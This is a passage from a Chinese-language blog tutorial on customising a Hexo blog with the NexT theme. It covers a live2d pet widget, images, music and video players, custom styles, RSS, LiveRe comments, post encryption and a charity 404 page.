class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"><span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;<span class="keyword">@keyframes</span> octocat-wave&#123;0%,100%&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">0</span>)&#125;20%,60%&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(-<span class="number">25deg</span>)&#125;40%,80%&#123;<span class="attribute">transform</span>:<span class="built_in">rotate</span>(<span class="number">10deg</span>)&#125;&#125;<span class="keyword">@media</span> (<span class="attribute">max-width:</span><span class="number">500px</span>)&#123;<span class="selector-class">.github-corner</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:none&#125;<span class="selector-class">.github-corner</span> <span class="selector-class">.octo-arm</span>&#123;<span class="attribute">animation</span>:octocat-wave <span class="number">560ms</span> ease-in-out&#125;&#125;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="宠物"><a href="#宠物" class="headerlink" title="宠物"></a>宠物</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-helper-live2d</span><br><span class="line">yarn add live2d-widget-model-tororo		<span class="comment">#安装宠物白猫的模块</span></span><br><span class="line">vim _config.yml	<span class="comment">#博客的或主题的主配置文件都行,加入代码选择宠物类型</span></span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/EYHN/hexo-helper-live2d">hexo-helper-live2d</a><br><a href="https://github.com/xiazeyu/live2d-widget-models">live2d-widget-models</a></p>
<details><summary>宠物样式表</summary><br>

live2d-widget-model-chitose<br>
live2d-widget-model-epsilon2_1<br>
live2d-widget-model-gf<br>
live2d-widget-model-haru/01 (live2d-widget-model-haru)<br>
live2d-widget-model-haru/02 (live2d-widget-model-haru)<br>
live2d-widget-model-haruto<br>
live2d-widget-model-hibiki<br>
live2d-widget-model-hijiki<br>
live2d-widget-model-izumi<br>
live2d-widget-model-koharu<br>
live2d-widget-model-miku<br>
live2d-widget-model-ni-j<br>
live2d-widget-model-nico<br>
live2d-widget-model-nietzsche<br>
live2d-widget-model-nipsilon<br>
live2d-widget-model-nito<br>
live2d-widget-model-shizuku<br>
live2d-widget-model-tororo(白猫)<br>
live2d-widget-model-tsumiki<br>
live2d-widget-model-unitychan<br>
live2d-widget-model-wanko<br>
live2d-widget-model-z16<br>

</details>

<p><a href="https://blog.csdn.net/wang_123_zy/article/details/87181892">样式预览</a></p>
<p>需要先使用 <code>yarn add 模型的包名</code> 来安装</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">live2d:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">scriptFrom:</span> <span class="string">local</span></span><br><span class="line">  <span class="attr">pluginRootPath:</span> <span class="string">live2dw/</span>	<span class="comment"># 插件在站点上的根目录(相对路径)</span></span><br><span class="line">  <span class="attr">pluginJsPath:</span> <span class="string">lib/</span>	<span class="comment"># 脚本文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">pluginModelPath:</span> <span class="string">assets/</span>	<span class="comment"># 模型文件相对与插件根目录路径</span></span><br><span class="line">  <span class="attr">tagMode:</span> <span class="literal">false</span>	<span class="comment"># 标签模式, 是否仅替换 live2d tag标签而非插入到所有页面中</span></span><br><span class="line">  <span class="attr">log:</span> <span class="literal">false</span>	<span class="comment"># 调试, 是否在控制台输出日志</span></span><br><span class="line">  <span class="attr">model:</span></span><br><span class="line">    <span class="attr">use:</span> <span class="string">live2d-widget-model-tororo</span>	<span class="comment"># 模块名，博客根目录/node_models/ 下的目录名</span></span><br><span class="line">  <span class="attr">display:</span>		<span class="comment">#放置位置和大小</span></span><br><span class="line">    <span class="attr">position:</span> <span class="string">right</span></span><br><span class="line">    <span class="attr">width:</span> <span class="number">300</span></span><br><span class="line">    <span class="attr">height:</span> <span class="number">600</span></span><br><span class="line">  <span class="attr">mobile:</span></span><br><span class="line">    <span class="attr">show:</span> <span class="literal">true</span>		<span class="comment">#是否在手机端显示</span></span><br><span class="line">  <span class="attr">react:</span></span><br><span class="line">    <span class="attr">opacity:</span> <span class="number">0.7</span>    <span class="comment">#透明</span></span><br></pre></td></tr></table></figure>
<h2 id="文章插入图片"><a href="#文章插入图片" class="headerlink" title="文章插入图片"></a>文章插入图片</h2><h3 id="hexo-自带方式"><a href="#hexo-自带方式" class="headerlink" title="hexo 自带方式"></a>hexo 自带方式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># &#123;% asset_img &lt;slug&gt; [title] %&#125;</span><br><span class="line">&#123;% asset_img example.jpg This is an example image %&#125;</span><br></pre></td></tr></table></figure>
<p>hexo-renderer-marked 3.1.0引入了一个新的选项，允许在markdown不使用 <code>asset_img</code> 标签插件的情况下嵌入图像</p>
<figure class="highlight yml"><figcaption><span>$blog/_config.yml</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prependRoot:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">postAsset:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>然后在文章中使用:</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">![<span class="string">image</span>](<span class="link">image.jpg</span>)</span><br></pre></td></tr></table></figure>
<p><a href="https://hexo.io/zh-cn/docs/asset-folders">详细参考</a></p>
<h3 id="插件方式"><a href="#插件方式" class="headerlink" title="插件方式"></a>插件方式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.yml		<span class="comment">#修改博客配置文件，开启资源文件夹</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="comment">#开启后新建文章的时会同时创建一个同名文件夹用于存放文章资源（如:图片）</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-asset-image 	<span class="comment">#安装插件</span></span><br><span class="line">vim node_modules/hexo-asset-image/index.js   <span class="comment">#修改文件配置，修正一个错误</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> endPos = link.length-<span class="number">1</span>;	<span class="comment">//将第24行修改为这样</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>将图片放到该文件夹下，在文章中添加图片</strong></p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">![<span class="string">image_name</span>](<span class="link">name.jpg</span>)		#只需要添加文件名即可，无需加上目录</span><br></pre></td></tr></table></figure>
<h2 id="侧边栏加入音乐播放器"><a href="#侧边栏加入音乐播放器" class="headerlink" title="侧边栏加入音乐播放器"></a>侧边栏加入音乐播放器</h2><p>到网易云音乐选择歌单，生成外链</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;iframe frameborder&#x3D;&quot;no&quot; border&#x3D;&quot;0&quot; marginwidth&#x3D;&quot;0&quot; marginheight&#x3D;&quot;0&quot; width&#x3D;298 height&#x3D;52 src&#x3D;&quot;&#x2F;&#x2F;music.163.com&#x2F;outchain&#x2F;player?type&#x3D;2&amp;id&#x3D;1365959078&amp;auto&#x3D;1&amp;height&#x3D;32&quot;&gt;&lt;&#x2F;iframe&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/sidebar.swig	<span class="comment">#将生成的外链放到合适的位置即可</span></span><br></pre></td></tr></table></figure>
<h2 id="文章结束标语"><a href="#文章结束标语" class="headerlink" title="文章结束标语"></a>文章结束标语</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/passage-end-tag.swig	<span class="comment">#新建文件并加入内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">    &#123;% if not is_index %&#125;</span><br><span class="line">        &lt;div style&#x3D;&quot;text-align:center;color: #ccc;font-size:14px;&quot;&gt;-------------本文结束&lt;i class&#x3D;&quot;fa fa-paw&quot;&gt;&lt;&#x2F;i&gt;感谢阅读-------------&lt;&#x2F;div&gt;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim themes/next/layout/_macro/post.swig	<span class="comment">#在post body 中 END POST BODY 前加入</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;div&gt;</span><br><span class="line">  &#123;% if not is_index %&#125;</span><br><span class="line">    &#123;% include &#39;passage-end-tag.swig&#39; %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml		<span class="comment">#加入以下内容</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文章末尾添加“本文结束”标记</span></span><br><span class="line"><span class="attr">passage_end_tag:</span></span><br><span class="line">  <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml</span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 定义自定义文件路径</span></span><br><span class="line"><span class="comment"># 在站点目录`source/_data`中创建自定义文件，并在下面取消注释所需的文件</span></span><br><span class="line"><span class="attr">custom_file_path:</span></span><br><span class="line">  <span class="comment">#head: source/_data/head.swig</span></span><br><span class="line">  <span class="comment">#header: source/_data/header.swig</span></span><br><span class="line">  <span class="comment">#sidebar: source/_data/sidebar.swig</span></span><br><span class="line">  <span class="comment">#postMeta: source/_data/post-meta.swig</span></span><br><span class="line">  <span class="comment">#postBodyEnd: source/_data/post-body-end.swig</span></span><br><span class="line">  <span class="comment">#footer: source/_data/footer.swig</span></span><br><span class="line">  <span class="comment">#bodyEnd: source/_data/body-end.swig</span></span><br><span class="line">  <span class="comment">#variable: source/_data/variables.styl</span></span><br><span class="line">  <span class="comment">#mixin: source/_data/mixins.styl</span></span><br><span class="line">  <span class="attr">style:</span> <span class="string">source/_data/styles.styl</span></span><br></pre></td></tr></table></figure>
<h3 id="文章阴影"><a href="#文章阴影" class="headerlink" title="文章阴影"></a>文章阴影</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#新建并添加自定义样式</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Custom styles.</span></span><br><span class="line"><span class="comment">// 主页文章添加阴影效果</span></span><br><span class="line"> <span class="selector-class">.post</span> &#123;</span><br><span class="line">   <span class="attribute">margin-top</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">margin-bottom</span>: <span class="number">60px</span>;</span><br><span class="line">   <span class="attribute">padding</span>: <span class="number">25px</span>;</span><br><span class="line">   -webkit-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">105</span>,<span class="number">105</span>,<span class="number">105</span>,<span class="number">0.5</span>);</span><br><span class="line">   -moz-<span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">5px</span> rgba(<span class="number">105</span>,<span class="number">105</span>,<span class="number">105</span>,<span class="number">0.5</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h3 id="背景图及透明度"><a href="#背景图及透明度" class="headerlink" title="背景图及透明度"></a>背景图及透明度</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#添加自定义样式</span></span><br><span class="line"><span class="comment">#将背景图放到图片目录(source/images)下即可</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 添加背景图片</span></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line">  background: url(/images/background.jpg);</span><br><span class="line">  <span class="attribute">background-size</span>: cover;</span><br><span class="line">  <span class="attribute">background-repeat</span>: no-repeat;</span><br><span class="line">  <span class="attribute">background-attachment</span>: fixed;</span><br><span class="line">  <span class="attribute">background-position</span>: <span class="number">50%</span> <span class="number">50%</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//文章内容的透明度设置</span></span><br><span class="line"><span class="selector-class">.content-wrap</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//侧边框的透明度设置</span></span><br><span class="line"><span class="selector-class">.sidebar</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.8</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//站点概况透明度设置</span></span><br><span class="line"><span class="selector-class">.sidebar-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.8</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单栏的透明度设置</span></span><br><span class="line"><span class="selector-class">.header-inner</span> &#123;</span><br><span class="line">  <span class="attribute">background</span>: rgba(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>,<span class="number">0.3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//搜索框（local-search）的透明度设置</span></span><br><span class="line"><span class="selector-class">.popup</span> &#123;</span><br><span class="line">  <span class="attribute">opacity</span>: <span class="number">0.85</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://www.wolfdan.cn/Hexo-Next-Gemini%E4%B8%BB%E9%A2%98%E9%80%8F%E6%98%8E%E5%8C%96%E4%BB%A5%E5%8F%8A%E8%83%8C%E6%99%AF%E5%9B%BE%E7%89%87%E7%9A%84%E6%9B%B4%E6%94%B9/">透明设置另外版,代码块不太美观</a></p>
<p>解决按钮透明度: <code>themes\next\source\css\_common\components\post\post-button.styl</code> 同上修改对应位置为 <code>background: transparent;</code></p>
<h3 id="字体颜色"><a href="#字体颜色" class="headerlink" title="字体颜色"></a>字体颜色</h3><p>在自定义样式文件 <code>source/_data/styles.styl</code> 中添加定义</p>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="comment">//博客标题字体色</span></span><br><span class="line"><span class="selector-class">.site-title</span> &#123;</span><br><span class="line">	<span class="attribute">color</span>: <span class="number">#00BFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//菜单字体色</span></span><br><span class="line"><span class="selector-class">.menu</span> <span class="selector-class">.menu-item</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">	<span class="attribute">color</span>: <span class="number">#8B1A1A</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//底部字体色</span></span><br><span class="line"><span class="selector-class">.footer-inner</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#EE00EE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="配置链接文本样式"><a href="#配置链接文本样式" class="headerlink" title="配置链接文本样式"></a>配置链接文本样式</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/_data/styles.styl	<span class="comment">#添加自定义样式</span></span><br></pre></td></tr></table></figure>
<figure class="highlight styl"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.post-body</span> <span class="selector-tag">p</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: <span class="number">#0593d3</span>;</span><br><span class="line">  <span class="attribute">border-bottom</span>: none;</span><br><span class="line">  <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#0593d3</span>;</span><br><span class="line">  &amp;:hover &#123;</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fc6423</span>;</span><br><span class="line">    <span class="attribute">border-bottom</span>: none;</span><br><span class="line">    <span class="attribute">border-bottom</span>: <span class="number">1px</span> solid <span class="number">#fc6423</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h1><h2 id="文章模板"><a href="#文章模板" class="headerlink" title="文章模板"></a>文章模板</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim scaffolds/post.md</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: &#123;&#123; title &#125;&#125;</span><br><span class="line">date: &#123;&#123; date &#125;&#125;</span><br><span class="line">tags: [标签1,标签2,...]</span><br><span class="line">categories: [1级分类,2级分类,...]</span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="文章内容中的影音"><a href="#文章内容中的影音" class="headerlink" title="文章内容中的影音"></a>文章内容中的影音</h2><h3 id="音乐"><a href="#音乐" class="headerlink" title="音乐"></a>音乐</h3><p><strong>直接使用HTML标签</strong>:<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;https://音乐链接.mp3&quot;</span> <span class="attr">style</span>=<span class="string">&quot;max-height :100%; max-width: 100%; display: block; margin-left: auto; margin-right: auto;&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">loop</span>=<span class="string">&quot;loop&quot;</span> <span class="attr">preload</span>=<span class="string">&quot;meta&quot;</span>&gt;</span>Your browser does not support the audio tag.<span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<p><strong>使用插件(<code>hexo-tag-aplayer</code>),有显示歌词功能，也美观</strong><br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn add hexo-tag-aplayer</span><br></pre></td></tr></table></figure></p>
<p>然后在文章中使用:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% aplayer &quot;歌曲名&quot; &quot;歌手名&quot; &quot;https:&#x2F;&#x2F;音乐链接.mp3&quot; &quot;https:&#x2F;&#x2F;封面图.jpg&quot; &quot;lrc:https:&#x2F;&#x2F;歌词.lrc&quot; %&#125;</span><br></pre></td></tr></table></figure>
<p>支持歌单:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% aplayerlist %&#125;</span><br><span class="line">&#123;</span><br><span class="line">    &quot;autoplay&quot;: false,</span><br><span class="line">    &quot;showlrc&quot;: 3,</span><br><span class="line">    &quot;mutex&quot;: true,</span><br><span class="line">    &quot;music&quot;: [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;title&quot;: &quot;歌曲名&quot;,</span><br><span class="line">            &quot;author&quot;: &quot;歌手名&quot;,</span><br><span class="line">            &quot;url&quot;: &quot;https:&#x2F;&#x2F;音乐链接.mp3&quot;,</span><br><span class="line">            &quot;pic&quot;: &quot;https:&#x2F;&#x2F;封面图.jpg&quot;,</span><br><span class="line">            &quot;lrc&quot;: &quot;https:&#x2F;&#x2F;歌词.lrc&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;title&quot;: &quot;歌曲名&quot;,</span><br><span class="line">            &quot;author&quot;: &quot;歌手名&quot;,</span><br><span class="line">            &quot;url&quot;: &quot;https:&#x2F;&#x2F;音乐链接.mp3&quot;,</span><br><span class="line">            &quot;pic&quot;: &quot;https:&#x2F;&#x2F;封面图.jpg&quot;,</span><br><span class="line">            &quot;lrc&quot;: &quot;https:&#x2F;&#x2F;歌词.lrc&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br><span class="line">&#123;% endaplayerlist %&#125;</span><br></pre></td></tr></table></figure>
<p><a href="https://github.com/MoePlayer/hexo-tag-aplayer">hexo-tag-aplayer</a></p>
<h3 id="视频"><a href="#视频" class="headerlink" title="视频"></a>视频</h3><p><strong>直接使用HTML标签</strong>:<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">poster</span>=<span class="string">&quot;https://封面图.jpg&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://视频链接.mp4&quot;</span> <span class="attr">style</span>=<span class="string">&quot;max-height :100%; max-width: 100%; display: block; margin-left: auto; margin-right: auto;&quot;</span> <span class="attr">controls</span>=<span class="string">&quot;controls&quot;</span> <span class="attr">loop</span>=<span class="string">&quot;loop&quot;</span> <span class="attr">preload</span>=<span class="string">&quot;meta&quot;</span>&gt;</span>Your browser does not support the video tag.<span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p><strong>用插件(<code>hexo-tag-dplayer</code>)，可支持弹幕</strong>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">yarn add hexo-tag-dplayer</span><br></pre></td></tr></table></figure>
<p>然后在文章中使用:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% dplayer &quot;url&#x3D;https:&#x2F;&#x2F;视频链接.mp4&quot; &quot;https:&#x2F;&#x2F;封面图.jpg&quot; &quot;api&#x3D;https:&#x2F;&#x2F;api.prprpr.me&#x2F;dplayer&#x2F;&quot; &quot;id&#x3D;&quot; &quot;loop&#x3D;false&quot; %&#125;</span><br></pre></td></tr></table></figure>
<p>使用弹幕必须有 <code>api</code> 和 <code>id</code> 两项，并且若使用的是 <a href="https://github.com/MoePlayer/hexo-tag-dplayer">官方</a> 的 <code>api</code> 地址（即上面的），<code>id</code> 的值需要随机自定义，可用 <a href="https://tool.oschina.net/encrypt?type=2">工具</a> 将与众不同的文字😂生成哈希值来使用。</p>
<p><a href="https://github.com/MoePlayer/hexo-tag-dplayer">hexo-tag-dplayer</a></p>
<h2 id="配置RSS"><a href="#配置RSS" class="headerlink" title="配置RSS"></a>配置RSS</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-generator-feed	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#修改博客配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 添加RSS订阅配置内容</span></span><br><span class="line"><span class="attr">feed:</span></span><br><span class="line">  <span class="attr">type:</span> <span class="string">atom</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">atom.xml</span></span><br><span class="line">  <span class="attr">limit:</span> <span class="number">20</span></span><br><span class="line">  <span class="attr">hub:</span></span><br><span class="line">  <span class="attr">content:</span></span><br><span class="line">  <span class="attr">content_limit:</span> <span class="number">140</span></span><br><span class="line">  <span class="attr">content_limit_delim:</span> <span class="string">&#x27; &#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">rss:/atom.xml</span></span><br></pre></td></tr></table></figure>
<h2 id="配置评论系统"><a href="#配置评论系统" class="headerlink" title="配置评论系统"></a>配置评论系统</h2><p>到来必力注册登录，安装免费版填入相关信息后获得一串代码，在代码中有一串<code>uid</code>，将<code>uid值</code>复制出出来添加到主题配置文件中即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- 来必力City版安装代码 --&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;lv-container&quot; data-id&#x3D;&quot;city&quot; data-uid&#x3D;&quot;MTAyMC80NTMxNS8yMTgyOA&#x3D;&#x3D;&quot;&gt;</span><br><span class="line">	&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">   (function(d, s) &#123;</span><br><span class="line">       var j, e &#x3D; d.getElementsByTagName(s)[0];</span><br><span class="line"></span><br><span class="line">       if (typeof LivereTower &#x3D;&#x3D;&#x3D; &#39;function&#39;) &#123; return; &#125;</span><br><span class="line"></span><br><span class="line">       j &#x3D; d.createElement(s);</span><br><span class="line">       j.src &#x3D; &#39;https:&#x2F;&#x2F;cdn-city.livere.com&#x2F;js&#x2F;embed.dist.js&#39;;</span><br><span class="line">       j.async &#x3D; true;</span><br><span class="line"></span><br><span class="line">       e.parentNode.insertBefore(j, e);</span><br><span class="line">   &#125;)(document, &#39;script&#39;);</span><br><span class="line">	&lt;&#x2F;script&gt;</span><br><span class="line">&lt;noscript&gt; 为正常使用来必力评论功能请激活JavaScript&lt;&#x2F;noscript&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br><span class="line">&lt;!-- City版安装代码已完成 --&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim _config.next.yml	<span class="comment">#修改主题配置文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#找到LiveRe comments system</span></span><br><span class="line"><span class="comment"># LiveRe comments system</span></span><br><span class="line"><span class="comment"># You can get your uid from https://livere.com/insight/myCode (General web site)</span></span><br><span class="line"><span class="attr">livere_uid:</span> <span class="string">MTAyMC80NTMxNS8yMTgyOA==</span></span><br></pre></td></tr></table></figure>
<h2 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yarn add hexo-blog-encrypt	<span class="comment">#安装插件</span></span><br><span class="line">vim _config.yml		<span class="comment">#配置博客配置文件，文件内没有就自行添加</span></span><br></pre></td></tr></table></figure>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Security</span></span><br><span class="line"><span class="comment">##</span></span><br><span class="line"><span class="attr">encrypt:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>给文章加密</p>
<figure class="highlight md"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: 文章标题</span><br><span class="line">date: 2016-03-30 21:18:02</span><br><span class="line">password: 123456  #密码</span><br><span class="line">abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">message: 您好, 这里需要密码.</span><br><span class="line">wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line">wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<h2 id="腾讯公益404页面"><a href="#腾讯公益404页面" class="headerlink" title="腾讯公益404页面"></a>腾讯公益404页面</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vim <span class="built_in">source</span>/404.html	<span class="comment">#添加代码</span></span><br></pre></td></tr></table></figure>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;//qzonestyle.gtimg.cn/qzone/hybrid/app/404/search_children.js&quot;</span> <span class="attr">homePageName</span>=<span class="string">&quot;返回宝贝回家&quot;</span> <span class="attr">homePageUrl</span>=<span class="string">&quot;http://www.baobeihuijia.com&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
